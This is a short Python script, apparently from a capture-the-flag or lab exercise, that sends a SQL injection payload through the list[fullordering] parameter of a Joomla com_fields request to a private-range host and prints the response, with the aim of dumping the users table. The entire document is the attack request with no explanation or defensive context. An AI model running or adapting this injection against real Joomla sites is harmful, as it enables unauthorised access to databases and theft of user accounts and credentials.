#!/usr/bin/python3

import requests
import urllib

url = "http://10.10.132.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=SELECT * FROM users%27"
r = requests.get(url)

print(r.text)
